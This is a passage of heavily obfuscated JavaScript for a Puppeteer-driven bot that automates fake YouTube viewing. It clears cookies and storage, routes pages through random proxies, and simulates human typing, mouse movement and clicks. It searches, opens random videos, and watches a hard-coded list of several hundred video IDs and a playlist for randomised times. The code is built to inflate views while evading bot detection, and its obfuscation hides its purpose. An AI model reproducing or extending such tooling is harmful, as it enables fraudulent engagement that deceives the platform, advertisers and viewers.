          for (const a2 of a1)
            await Z['deleteCook' + 'ie'](a2);
          return await Z['evaluate'](() => {
            window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
          }), 0x181a + -0x4 * 0x8f2 + 0x1 * 0xbaf;
        }
        async function x(Z, a0 = -0x25f * -0xe + 0xc2b + -0x2 * 0x16ae) {
          let a1 = await p['newPage']();
          return await a1['setDefault' + 'Navigation' + 'Timeout'](-0x218 * 0x2 + 0x32 * -0x63 + 0x1 * 0x1786), a0 && await useProxy(a1, await getRandomProxy()), await a1['goto'](Z, {
            'timeout': 0x0
          }), a1;
        }
        async function y(Z) {
          return await wait(-0x5 * 0x3f3 + 0x33 * -0xa9 + -0x1 * -0x48f2), await Z['waitForNet' + 'workIdle']({
            'idleTime': 0x1d4c,
            'timeout': 0x0
          }), 0x5a3 + -0x653 * -0x3 + -0x1 * 0x189b;
        }
        async function z(Z) {
          log('watching..' + '.'), await Z['evaluate'](() => {
            var a1;
            (a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * -0x5f1 + 0x1080 + -0x9f * 0x11, -0xd1f + -0x15a7 + 0x22cd), a1[Math['floor'](Math['random']() * a1['length'])])['setAttribu' + 'te']('id', '__scope');
          }), await v('#__scope', 0x1fc7 + 0xbc * 0xc + -0x2897, Z), await y(Z);
          const a0 = await A(Z);
          return await wait(min((-0x55db + -0x4362 + -0x1dd1 * -0xd) * getRandomInt(0x35b * -0x6 + 0x1250 + -0x4 * -0x75, 0x2650 * 0x1 + 0xec * -0x26 + 0xa7 * -0x5), a0)), -0x97 * -0x5 + 0x2 * -0x91d + 0xf48;
        }
        async function A(Z) {
          return await Z['evaluate'](() => {
            const a0 = {
              'Seconds': 0x3e8,
              'Minutes': 0xea60,
              'Hours': 0x36ee80,
              'Second': 0x3e8,
              'Minute': 0xea60,
              'Hour': 0x36ee80
            };
            let a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
              a2 = 0x5b * -0x1d + 0x223f + -0x17f0;
            a1 = a1['split'](a1['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * 0xfbb + -0x2 * 0x1226 + -0x1 * -0x1492]['split']('\x20');
            for (let a3 = -0x2b0 * -0x5 + 0x1d * -0xde + 0xbb6; a3 < a1['length']; a3 += 0x5 * 0x5e + 0xf7d + 0x8f * -0x1f)
              a2 += a1[a3] * a0[a1[a3 + (-0x97b + -0x1a85 + 0x2401)]];
            return a2;
          });
        }
        async function B(Z) {
          log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await Z['goto'](channels['random'](), {
            'timeout': 0x0
          }), await v('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', -0x1 * -0x1e73 + -0x1e65 + -0x7 * 0x2, Z), log('clicked\x20vi' + 'deo\x20stuff'), await y(Z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await Z['evaluate'](() => {
            const a2 = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](a4 => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == a4['getAttribu' + 'te']('class'))['slice'](0xc08 + -0x3 * -0x69 + -0xd3d)['map'](a4 => Array['from'](a4['children']))['flat'](0xc07 + -0x23c6 + 0x17c0)['map'](a4 => a4['childNodes'][-0xf50 + 0x2413 + -0x2 * 0xa61]['childNodes'][0xbfb * 0x3 + -0x8 * -0x350 + -0xc7d * 0x5]['childNodes'][0x1 * 0x1337 + 0x1cde + 0x2 * -0x180a]['childNodes'][-0x178d * 0x1 + -0x164a + 0x2dd7]['childNodes'][-0x3e * 0x91 + 0x1 * -0x95f + 0x2c7e]);
            var a3;
            return (a3 = a2)[Math['floor'](Math['random']() * a3['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), a2['map'](a4 => a4['href']);
          }), await wait(getRandomInt(0x822 + 0x1a * 0x19 + 0x4 * -0x1b1, 0x238e + 0x21e * 0x1 + 0x1 * -0x1224)), await v('#__hookedV' + 'idToWatch', -0x1 * -0x8e1 + -0x2130 + 0x4 * 0x614, Z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(-0x17 * 0x517 + -0x27cc * -0x1 + 0x87dd);
          const a0 = await A(Z),
            a1 = min((-0x18f23 + 0x3f20 + 0x23a63) * getRandomInt(0x206 + 0xc2b + -0xe2f, 0xd78 + -0x1af * 0x17 + 0x1946 * 0x1), a0);
          return log('Watching\x20v' + 'id\x20for\x20' + a1 + ('ms,\x20max\x20ti' + 'me:\x20') + a0 + 'ms'), await wait(a1), 0xe1b + -0x7 * 0x53f + -0x1 * -0x169f;
        }
        async function C(Z) {
          const aG = b;
          return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await Z[aG(0x1, 'aHXK') + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await Z['evaluate'](() => {
            var a0;
            (a0 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](a1 => 'contents' != a1['id']), a0[Math['floor'](Math['random']() * a0['length'])])['children'][-0x2354 + -0xdb + 0x3b * 0x9d]['children'][0x12 * 0x12d + 0x6b8 + -0x1be2]['children'][0x1183 + 0x2 * 0x8f6 + -0x236f]['children'][0x1 * -0x12d6 + 0x22 * 0x8 + 0x11c6]['children'][0xe47 + -0xa62 * 0x3 + 0x10df]['setAttribu' + 'te']('id', 'gottemezez');
          }), await v('#gottemeze' + 'z', 0x1e1c * -0x1 + 0x10c3 + 0xd5a, Z), await y(Z), await z(Z), 0x93d + 0x32b + -0xc67;
        }
        async function D(Z) {
          const aI = b;
          log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await Z['evaluate'](() => {
            const aH = c;
            let a2 = Array['from'](document['querySelec' + 'torAll']('#search'));
            document['getElement' + 'ById']('__searchBo' + aH(0x4)) || a2['find'](a3 => 'INPUT' === a3['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
          }), await v('#__searchB' + 'oxReal', 0x1 * -0x14da + 0xf95 + -0x13 * -0x47, Z), await q['simKeyboar' + 'dType'](searchTerms[aI(0x6, 'aZCk')]() + ''), await v('#search-ic' + 'on-legacy', -0x952 + 0xf91 + -0x63f, Z), log('searching.' + '..'), await Z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await y(Z);
          let a0 = await Z['evaluate'](() => {
            const a2 = {
                'seconds': 0x3e8,
                'minutes': 0xea60,
                'hours': 0x36ee80,
                'second': 0x3e8,
                'minute': 0xea60,
                'hour': 0x36ee80
              },
              a3 = (a4 = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](a6 => a6['childNodes'][-0xabe * 0x2 + 0x1 * -0x73 + 0x15f1]['childNodes'][0x1c3b + -0x3 * -0x981 + -0x38bd]['childNodes'][0x5 * 0x237 + -0x22fc * -0x1 + -0x2e0e]))[Math['floor'](Math['random']() * a4['length'])];
            var a4;
            const a5 = a3['childNodes'][-0x1 * -0x3b + -0x23b2 + 0x6 * 0x5ea]['childNodes'][0x18 * 0xe9 + -0x1ae9 + -0x1 * -0x511]['childNodes'][-0x2 * -0xf77 + -0x13ee + -0xafe]['ariaLabel'];
            return a3['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
              function(a6) {
                let a7 = a6['split'](',\x20')['map'](a9 => a9['split']('\x20'))['flat'](0x24cb + -0x1475 * -0x1 + -0x393f),
                  a8 = 0x2238 + 0x6a8 + -0x28e0;
                for (let a9 = 0x4fd * -0x1 + -0x1470 + 0x196d; a9 < a7['length']; a9 += 0x2 * -0x40f + 0x9 * -0x12f + 0x12c7)
                  a8 += a7[a9] * a2[a7[a9 + (0x102b + 0x1 * -0x1a73 + 0xa49)]];
                return a8;
              }(a5);
          });
          await v('#__hookedV' + 'idToClick', 0x240a + -0x1aab + -0x95f * 0x1, Z);
          let a1 = min((-0x145cd + 0x10f79 * 0x1 + -0x482d * -0x4) * getRandomInt(0x3 * -0x269 + 0x6a6 + 0x96, -0xb4f * 0x3 + -0x1 * -0x17b7 + 0x2 * 0x520), a0 + (0x14 * 0x103 + 0xcce + 0x13 * -0xb6));
          return log('watching\x20v' + 'ideo\x20for\x20' + a1 + 'ms'), await wait(a1), 0x18d7 * -0x1 + 0xeec + -0x2 * -0x4f6;
        }
        const E = [
          'eHpl-BjXo5' + '8',
          '-PgyODlV6V' + '8',
          'S9EkXX0QYD' + 'U',
          'WvcG1OKdHW' + 'o',
          'b6gOcEwtZ8' + 'U',
          'apdtzA0Dzf' + 'k',
          'YiukDwYv2K' + '4',
          'zK-6UH5R5X' + '8',
          'bIXqNjtsEf' + '4',
          '3l253rESkw' + 'Q',
          'u6RVZKcN9z' + 'Q',
          '6ImZdwpdwT' + 'A',
          '0qPB5ANSBK' + 'c',
          '92duH3cqn1' + 'M',
          'b5lKI78fw3' + 's',
          'zpCCPZfP8L' + 'I',
          'ES7oooakr-' + 'c',
          '2eWyJ8FBvQ' + '8',
          'O4-B3OFPDf' + 'Q',
          'JFcnGk0_u7' + 'o',
          'AP7d2Ghq6d' + 'U',
          'UizEAwrZAG' + 'I',
          '0FAi5-h8Hj' + '0',
          'CNqA6IYj17' + 'k',
          'tSiKyCpwnS' + 'Y',
          'OrglyeV5xP' + 'Y',
          'BXkB-g4eCc' + 's',
          'Y53CmmpbOJ' + 's',
          'sm5MLz_IrQ' + 'k',
          'EuciRU_Ska' + '0',
          'cCbDCTLyPc' + 'E',
          'Ox7Ng5T7bm' + 'c',
          'TXTaB-dQg-' + '0',
          '3jSWaWgr_A' + '0',
          'xT8nvuxCRB' + 'E',
          '3c4Ab9EmRg' + 'Y',
          '2kScgeNOpL' + '8',
          't22jhowMom' + 'c',
          'HbcDLgkmXL' + 's',
          'JsKZ41uTeg' + 'c',
          'dfU48FRgs0' + 'g',
          '3K9ILewnUk' + 'o',
          'QmKwnRiKhD' + 'k',
          'n3nVsWsL6I' + 'k',
          'noTs52D_Mw' + 'Y',
          'A0tDR4nTTK' + '0',
          '9eBwFca-B1' + '4',
          'moasU30H5l' + 'A',
          '_Mb8oQtSBW' + 'E',
          'TNGGOgwPtc' + 'M',
          '-pYA-gjkQ8' + 's',
          '5d-dB6tZZA' + 'o',
          '8H2AiOV0oE' + 'o',
          'mI7aiKDGde' + 'w',
          'D-IMDYrj35' + '4',
          'gKgFiEgghy' + 'g',
          'mjVwfjJ2nj' + 'k',
          '6auDBi-D2H' + 'M',
          'X89-SWNdIE' + 'k',
          'T5Pn4LhIwj' + 'M',
          'wVnKGSjY3i' + '8',
          'g11NJftxw1' + '4',
          '9zHirkfEKk' + 'k',
          'ZyGS_AMbIa' + '4',
          'yG6bwB17ZP' + 's',
          'aytHiLe0s6' + 'U',
          'cGe-Mpw_F1' + 'w',
          'eMK7xV_nxZ' + 'o',
          'epJ2MAKa1Y' + 'Q',
          '5BNbKKMUhE' + 'o',
          'oxpAvc6tDP' + '8',
          'jRcc-NIR2R' + 'I',
          '258btO4mFw' + '4',
          'pXjJAUvSbQ' + 'A',
          '63-irfPjh2' + 'c',
          'xbrDZAFf3Q' + 's',
          'MVHMtRlesU' + 'g',
          'zed05qfHMB' + 'I',
          'nkhkxKUHsY' + 'g',
          'n4cSAqR9H1' + 'Q',
          'gOUPndcj7z' + 'I',
          'n3HBTTDHoX' + '8',
          'XIgMFHPIXv' + '4',
          'oQHKMky-_K' + 'c',
          'zfDgTzZ2nh' + '0',
          '1PYettRo-D' + 'M',
          'jzuZuwF490' + '4',
          '2DAgWTlXae' + '8',
          'keouUYA5hI' + 'k',
          'F7i7wRlGCd' + 'c',
          'uToD2c0CdJ' + 'c',
          'Y8DzpdFZZ8' + '8',
          '-rrH657DAa' + 'o',
          'QTrEEWtDks' + '4',
          'TWTSnQDuad' + 'Y',
          'a0GUyvgnzg' + 'c',
          'eSReWZQyKd' + 'E',
          'D_5pMqdKSs' + '4',
          'm0ie8gHS00' + 'I',
          '6WosqMq9ej' + 'o',
          aJ(0x18, 'IGTs') + '4',
          'j_fe6PfxW4' + 'Y',
          'GfPzi8SYr0' + 'w',
          'MSgZhNCwff' + 'M',
          'wxyBC_z6bI' + '8',
          'PkQpV-Fwhs' + 'k',
          'bVD6cWOVhN' + 'U',
          'mjZOpQlHbx' + 'M',
          'k_BXkcdbBO' + 'M',
          'X72oUsFV7q' + '0',
          'lONsILfq-W' + 'Y',
          'Bhe9PyM_s_' + 'Q',
          'Bhe9PyM_s_' + 'Q',
          'h4TBnDkX4y' + 'o',
          'PNBJyHEkfk' + '4',
          'L3iHS__ufc' + 'g',
          'm7aliUAwm_' + 'Y',
          'FuPVf85zMi' + 'w',
          'gtupAeNTDS' + 'M',
          'yyJ8zkckoB' + '8',
          'ZDTESiN1eS' + 'w',
          'Fo6x16DkoR' + 'o',
          'IAJqRxhVqO' + 'k',
          'KAgwII8TGj' + 'o',
          'o4tLCshmlb' + 'M',
          'dLj5fIupdA' + 'o',
          '_Xl_-b9P4U' + 'Q',
          'V3NxxpUUfW' + 'E',
          'J3ygeDEMnO' + 'w',
          'HcP_xmdwsl' + 'c',
          'M9g0h7px2_' + 'M',
          'b5WfUvcSgr' + 'U',
          'JGHnIshsoC' + 'E',
          'x2gfhCLHd9' + '4',
          'M5Fr8G0ma9' + 'o',
          '3sGeIBfFlC' + 'M',
          'k74y4KOJ2m' + '4',
          'pTHJB0S8E-' + 'U',
          'KaIrXJLfYP' + 'M',
          '0cisZkywhg' + 'Q',
          '0dVzItbl9E' + 'w',
          't0EqnhcSb1' + 's',
          'MuiXtvo1RY' + 'E',
          'Nj-3KC6knH' + 'w',
          'B19HbETNi5' + '8',
          'yKN_QkroH6' + 's',
          'U9ExFM1pji' + '0',
          'sONzDfjKhL' + '4',
          'n3Kj8zEfew' + 'U',
          'nXLGQ7QeoG' + 'Y',
          'OQFQiwiM-P' + 'Y',
          'UtPRpKRTtH' + 'U',
          'E56Myp0BzE' + 'E',
          '7DjOp_JM2Z' + 'w',
          'rNFLQFz_G1' + 'g',
          '1r2pKoVAdj' + 'M',
          'gm3eiv6UND' + 'M',
          'yOiROfjxzX' + 'o',
          'lt2AcxC_ap' + 'g',
          'bObEme2BDO' + 'E',
          '6Ut6HbJmW4' + 'w',
          'fUs0TtQQTo' + '0',
          '_phHS3FAgW' + 'Q',
          '1f8sU4l3dP' + '4',
          'HwTSLUd53K' + '8',
          'EpP2ymD_QG' + 'A',
          'TQ69QFqmbo' + 'I',
          'wA8BqUka_u' + '0',
          'bc8Ey-vuR5' + 'M',
          'PZ_uLi7ULl' + '0',
          'smu5FsnhwF' + '4',
          'dv1JluwoOb' + 'c',
          'nHotP0jbcv' + 'A',
          'iIjYNEmrVv' + 'M',
          'SeP-OZAiPb' + 'c',
          'v52PClvMFt' + 'k',
          '3loLqIPxTS' + '0',
          'jVu9mOzbSq' + 'U',
          '73SAN1vOrV' + 'k',
          'YLPxp4ntym' + 's',
          'YWXfelRk3b' + 'Q',
          'CsxlLMb6Uj' + 'o',
          'uafGOfwzpa' + 'Q',
          'XIr8qotHOI' + 'E',
          'EcoPCWC3Uh' + 'o',
          'AhOwyT8aIh' + 'g',
          't-Ox7lI5UH' + 's',
          'i08qNmssXe' + 'Q',
          'QrJIU09eD-' + 'g',
          'QvNNCQ-8Rp' + 'E',
          'k5gjnjDFAZ' + 's',
          'h_NQ3y1ek8' + 'U',
          'evPsJlNLy_' + '4',
          'qEPTydgwh4' + 's',
          'LB685ckhuf' + 'E',
          'Lj1EcSMGey' + '0',
          'OE19r7MIMW' + 'Q',
          'u8E3p0Vy-P' + 'Y',
          'f4a5OPFQa7' + 'k',
          'XDo7Q7yUEt' + 'k',
          'Vw_9zw0qHI' + 'c',
          'KGT5nbDsI_' + '8',
          'E008Eql59M' + 'Q',
          'wSOFdefX47' + 'A',
          '2xcv7q3QhR' + 'E',
          'hgfvmcBkc0' + '4',
          '0wP7csnX7k' + '4',
          'Xo0R8WiRSb' + '4',
          '8zNp8EOpGd' + '4',
          'sWYhIJZmoS' + 'E',
          'YdG8U1W-bX' + '0',
          'QeDsoSNml-' + 'c',
          'xW5q77El0x' + '8',
          'ZF14issJFE' + 'Y',
          'TRglEGLLKX' + 'o',
          'UE0SXc5k1e' + 'g',
          '6VY65D8f3D' + 'Q',
          'Iwxuob4fA8' + 'Q',
          'M4elJHCUIi' + 's',
          'GY9WWhO504' + 'k',
          'eErUSxmLDw' + '8',
          'ITQfAfzLj3' + 'I',
          'vbDrCL2FuL' + 'g',
          'KyQ_sUgtbK' + 'U',
          'lbEJcipUp8' + 'I',
          '2SqCn2LreN' + 'g',
          '1i-G2TUn41' + '0',
          's0ru6uK7vi' + '8',
          'gOxiE5UAAD' + 'w',
          'lx1rOOjekc' + '8',
          '5VYN2zA-Si' + 'k',
          'q9rLWEAzoo' + 'k',
          '4KSm3IY7Xz' + 'g',
          'fMqRu_ON-D' + 'E',
          'GfvShU6Sy9' + 'A',
          'OHzOmi1b60' + 'Y',
          'D9oTUKT-_n' + 'A',
          '_BrT2PlUiw' + '0',
          'kuuI4LzKgm' + 'I',
          '78dymyg88r' + 'M',
          'mi0nGt2B-q' + 'o',
          'HaI7BjnwnO' + 'c',
          aK(0xa) + 'Y',
          '3VmtckvTXl' + 'U',
          'ed7TWHKDr4' + 'E',
          '2LfTjyVtbf' + 'U',
          'STHlCkloyv' + 'E',
          '-BI_-6YnM6' + 'Y',
          'LSK_G1qCQw' + 'M',
          '4tzqIl6EKV' + 'k',
          '9DshU55EiV' + '8',
          'mBtaEI_6e8' + 's',
          '960lvuduwY' + 'w',
          'XWJH-6J5Ee' + 'g',
          'XLS4qmyCAX' + 'g',
          '8cJDYeRiLn' + 'k',
          'cCaIVrltHz' + 'w',
          '8X2fF4pgM0' + 'E',
          '6s8Xm4wylr' + '4',
          'eFceshvavn' + 'o',
          '2h4g7euqR-' + 'U',
          'ujiBqXnn92' + '8',
          'w9F2NST-9j' + 's',
          'w-oc7F5Mmy' + 'U',
          'UYrmqL3cOD' + 'U',
          '4QB59etj0I' + 'o',
          'MY9MTNgXcN' + 'o',
          'ISBmcKDS5C' + '8',
          'ogIb7A7tvW' + '0',
          '-L583IZF6s' + 'k',
          'NbeKQq29ZL' + '0',
          'SPplDxd74F' + 's',
          'MHGV8QmpAz' + 'k',
          'iWzezFWpU7' + 'A',
          'NNCQt1rXXE' + 'Y',
          'bcb_ZhJJK8' + 'g',
          '3KoZGQiY6N' + 'o',
          'aSaXQH8F1_' + 'A',
          'V5nMOhI62o' + 'w',
          'JvlPjRUdId' + '0',
          '2gQHuClLCb' + '0',
          '5e-qDy-uUJ' + 'E',
          'oE8vC0QEWU' + 'E',
          '7cQken99yu' + 'o',
          'pmzu080j7r' + 'I',
          'sVy9F4whP6' + 'o',
          'MJrkylk7iE' + 'c',
          'XYjsTxi6oE' + '8',
          'mKlMouB6tp' + '0',
          'o2yunZQley' + 'A',
          'oRryU9F9Lv' + 's',
          'uzzK-052H0' + 'c',
          'VSvA4rCe-4' + 'M',
          'XURH2u_0fM' + 'I',
          'yfpVL2g_tk' + 'o',
          'AuEEjQ8x9o' + 'w',
          'wWkviY8zBr' + 'c',
          'zt_eubHWhx' + 'c',
          'O_7_BGU3u_' + '0',
          'QFDKBxmOn3' + 'Y',
          'w6gccNWXXv' + 'g',
          'VdNJxbrqdX' + 's',
          'wbi5Dxebvn' + 'I',
          'XEFOREYrJg' + 'k',
          'I2rcRta7WJ' + '0',
          'OP5KGfXHX_' + 'A',
          'w2MUMbbwlm' + 'o',
          'X3bF0nd6kf' + 'w',
          'WDDAhASf9j' + 'w',
          'fRwcV8gjbc' + 'w',
          '7T63gaRThr' + '0',
          'zC8AWIwhbf' + 's',
          'JSkVE0n-ee' + 'o',
          'qiQA5pWWRt' + 'U',
          'QdXCjZtfXu' + 'c',
          'vlBji8TOax' + 'o',
          'pBx_5CbIcp' + 'o',
          'L1Oy5F6ZMO' + 'Q',
          'P0NjLaBed-' + 'E',
          'DR16C4-keB' + '0',
          'LGmpIpu9eD' + 'w',
          'rNkX_A4kBA' + 'Q',
          'QztVMjrEk4' + '0',
          'uOM6m6KL5d' + '4',
          'g-Aju8xrrO' + 'E',
          'DfkDbFk_x9' + '8',
          'Y4NLDaowD6' + 'I',
          'ALSZnqQTuJ' + 'o',
          'xUmB6BpZBE' + 'w',
          'SxNOcZ1s85' + '8',
          '-noeCjO416' + 'k',
          'taPJqXBI8V' + 'Y',
          'YxqbkMi1Is' + '4',
          'vnJTyve2r-' + '4',
          '44lRVYQ38E' + 'Q',
          'QOv1N1X5J-' + 'g',
          'jNjREs7ODT' + 'g',
          'U30ToJo3dd' + 'k',
          'rm7lNIIOQC' + 'Y',
          'mGU6sOPlYv' + 'c',
          '6pwxUXdt6T' + 'Q',
          '6MkJRee35a' + 'Q',
          'LVbf7U9WAI' + 'c',
          'gPbhFvEeJ3' + 'M',
          'LWXAxz0MiH' + 'A',
          'L0KQJqfwJJ' + 'Y',
          'GWr33_u0VK' + 'c',
          '4ud3ZPfWkH' + 's',
          'dxSrySC4XM' + 'c',
          'iIM2KZC69W' + '0',
          '8DuJ3BAwME' + 'o',
          'm3BAhe1wsl' + 'Y',
          '02U_3pAZxM' + '8',
          '0e7nidPa97' + 'g',
          'TixW__6Eer' + 'o',
          'q46W8MTRTC' + 'E',
          'Jdxp04Je1O' + 'w',
          'HfP4TO3gfN' + '0',
          '4dUJaeB0qL' + '8',
          'xnL-fRJ3RZ' + 'o',
          'yJbD0Df45u' + 'Q',
          '-pGw8RkSSB' + 'k',
          '7cy86Njsis' + 'M',
          'jbgqvxtauo' + '4',
          'N8M00JjSVI' + 'I',
          'MfR5q6Td3R' + 'c',
          'eHwcx94wcp' + 's',
          'olDgVFgAgP' + 'o',
          'eAAd5BmzXz' + 'M',
          'xgTjQ2sGXd' + '4',
          'ipny6JUbzw' + 's',
          'WOwQ0UxbRj' + '4',
          'h0PKFed2GB' + 's',
          'JxdOrgzq7Z' + '8',
          aK(0x19) + 'w',
          '-ix4OizkAn' + 's',
          'd3CRE9y3YV' + 's',
          '4QZlfXxorJ' + 'o',
          'YlDpg8aCs5' + 'M',
          'Qe5WT22-AO' + '8',
          'b_rjBWmc1i' + 'Q',
          '9yjZpBq1XB' + 'E',
          'hPx-RiBKXt' + 'Q',
          'UMqLDhl8PX' + 'w',
          'DlJEt2KU33' + 'I',
          'BWeqoARup-' + 'Q',
          '2Dx76lD8Sc' + 'c',
          'j_nI6G3ZDi' + 'E',
          'zvcUYYN1sx' + 'w',
          'cWRkYo1S3L' + '4',
          'cWRkYo1S3L' + '4',
          'bxC_PN3SRv' + 'I',
          '94m93T_5JL' + 'M',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'bo9fTeXvSi' + 'A',
          'z6LqXiAK-8' + '0',
          '5tbOspjJ5f' + '0',
          'twQ6kKjtBk' + 'Y',
          'Ig17K38Fy0' + 'Y',
          'ZdlrVDwn_a' + '4',
          aL(0x7) + 'g',
          'acAvMGQtln' + 'M',
          '8XkcbdSRdO' + '0',
          '0e3GPea1Ty' + 'g',
          'zxYjTTXc-J' + '8',
          '9bqk6ZUsKy' + 'A',
          'plSyrHqUh7' + '8',
          'HkvQywg_uZ' + 'A',
          'lADBHDg-Jt' + 'A',
          'I2O7blSSzp' + 'I',
          'kd2KEHvK-q' + '8',
          'CbUjuwhQPK' + 's',
          'fb7T1v_VHp' + 'E',
          'SpeSpA3e56' + 'A',
          'RQdxHi4_Pv' + 'c',
          'nx2-4l4s4N' + 'w',
          'tUTCq3iiw_' + '4',
          'VDa5iGiPgG' + 's',
          'S-sJp1FfG7' + 'Q',
          'Hm1YFszJWb' + 'Q'
        ];
        async function F(Z) {
          const aM = b;
          await Z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + E['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await v('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x221b * 0x1 + 0xf12 + -0x312c, Z), await v('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + aM(0xf, '&Eik') + 'touch-feed' + 'back-shape' + '__fill', -0x1fc * 0x1 + -0x16af + 0x18ac, Z);
          const a0 = setInterval(async () => {
            log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await Z['evaluate'](() => {
              setTimeout(() => {
                document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
              }, 0x16d8 + 0x1cd0 + -0x27f0 + (-0x16 * 0x5c + -0x15e9 + 0x21b9) * Math['random']());
            });
          }, 0x15 * -0x6e + -0x3 * -0xa85 + 0x4cf);
          await wait(-0x57e20 + -0x48d74 + 0xe9f74);
          try {
            Z['$']('#__lllll') && await v('#__lllll', 0x129e + 0x2 * 0x6b6 + 0x1 * -0x2009, Z);
          } catch (a1) {}
          return await wait((0x18a15 + -0x1af1 + -0x84c4) * getRandomInt(0x81 * 0x4d + 0x1 * 0x1952 + -0x401b * 0x1, -0x1baf + 0x1d82 + -0x1ba)), clearInterval(a0), 0x1075 + -0x2516 + 0x14a2;
        }
        const G = [
          D,
          B,
          C,
          F
        ];
        async function H() {
          return await wait(-0x2140 + -0xad * -0x35 + 0x1c9 * -0x1 + (-0x3 * 0x1bf + -0xa0 + 0x6a5) * random()), 0x127b + -0x1dab + 0xb31;
        }
        async function I(Z, a0, ...a1) {
          const aN = c;
          Check['ia'](Z, Page, Frame), Check['nes'](a0), Check['all'](a1, 'string');
          let a2 = [];
          ! function a5(a6) {
            a2['push'](a6);
            for (const a7 of a6['childFrame' + 's']())
              a5(a7);
          }(Z['mainFrame']());
          const a3 = 'qkdjuqwyhd' + 'uqjidwqdjq' + 'hn' + GSI++,
            [a4] = await Promise[aN(0x1b)](a2['map'](a6 => setWait(a6, a0, a1, a3)));
          return await a4['$']('.' + a3);
        }
        async function J(Z, a0, a1, a2 = -0xa * -0x162 + 0x2571 + -0x3344) {
          if (!Z['fakeUserAc' + 'tion'])
            return warn('Requires\x20F' + 'UA\x20hoist!');
          Check['inst'](a0, ElementHandle), Check['nes'](a1), '_click' === a1 ? await Z['fakeUserAc' + 'tion']['simClickEl' + 'ement'](a0) : '_view' === a1 ? await Z['fakeUserAc' + 'tion']['simMouseMo' + 'veToElemen' + 't'](a0) : await K(Z, [
            'type',
            a1
          ]), a2 && a0 && await a0['dispose']();
        }
        async function K(Z, ...a0) {
          if (!Z['fakeUserAc' + 'tion'])
            throw new Error('Controller' + '\x20still\x20not' + '\x20hoisted!');
          Check['cust'](a0, a1 => a1['every'](a2 => 'string' == typeof a2 || Array['isArray'](a2)));
          for (let a1 of a0)
            if ('object' == typeof a1) {
              const a2 = a1['slice'](0x6d * 0xb + 0x13 * 0xb6 + -0xc * 0x184),
                a3 = a1[-0x1db2 + 0x19 * -0x4e + -0x30 * -0xc7];
              switch (flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20ac' + 'tionType:', a3, 'with\x20argum' + 'ents:', a2), a3) {
                case 'waitfunc':
                  {
                    const [a4, a5] = a2;
                    'string' != typeof a4 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a5 instanceof Page || a5 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a5['waitForFun' + 'ction'](a4);
                  }
                  break;
                case 'waitsel':
                  {
                    const [a6, a7] = a2;
                    'string' != typeof a6 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a7 instanceof Page || a7 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a7['waitForSel' + 'ector'](a6);
                  }
                  break;
                case 'type':
                  if ('string' != typeof a2[0x7df + 0x362 * 0xb + -0x2d15] && (warn('[WATCHDOG]' + '\x20Text\x20fail' + 'ure\x20here:', a2), 'number' == typeof a2[0x1 * -0xb03 + -0x2 * -0x117e + -0x1 * 0x17f9])) {
                    const a8 = a2[0x1208 + 0x23b2 + -0x1 * 0x35ba] + '';
                    warn('[WATCHDOG]' + '\x20Recoverab' + 'le\x20error,\x20' + 'state:', a2[-0x81b + 0x143b * -0x1 + 0x1c56], a8), a2[-0x21c1 + 0x2 * -0x197 + 0x131 * 0x1f] = a8;
                  }
